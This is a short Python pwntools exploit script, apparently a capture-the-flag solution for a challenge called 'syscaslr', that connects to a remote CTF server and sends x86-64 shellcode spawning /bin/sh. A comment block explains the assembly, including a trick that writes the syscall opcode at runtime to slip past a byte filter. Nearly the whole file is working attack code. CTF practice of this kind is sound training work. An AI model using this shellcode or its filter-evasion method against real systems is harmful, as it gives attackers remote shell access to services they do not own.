#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./syscaslr")
'''
gdb.attach(r, """
	c
	""")
'''
r = remote("actf.jinblack.it", 4002)
#input("wait")

shellcode = b"\x48\x31\xF6\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x57\x54\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x99\x49\xC7\xC3\x0E\x04\x00\x00\x49\x81\xC3\x01\x01\x00\x00\x4C\x89\x1D\x00\x00\x00\x00" 

r.send(shellcode)

r.interactive()

'''
shellcode: \x48\x31\xF6\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x57\x54\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x99\x49\xC7\xC3\x0E\x04\x00\x00\x49\x81\xC3\x01\x01\x00\x00\x4C\x89\x1D\x00\x00\x00\x00:

Assembly of the shellcode:

zero out rsi register
xor    rsi,rsi

move /bin/sh in rdi
mov rdi,0x68732f2f6e69622f

push registers on the stack
push   rsi
push   rdi
push   rsp

pop rdi to obtain the address of /bin/sh on the stack
pop    rdi

rax = 3b to make a syscall
mov rax, 0x3b
cdq

builds 0x050f --> syscall
mov    r11,0x40e
add    r11,0x101

change the instruction pointer to execute the syscall
mov [rip], r11
'''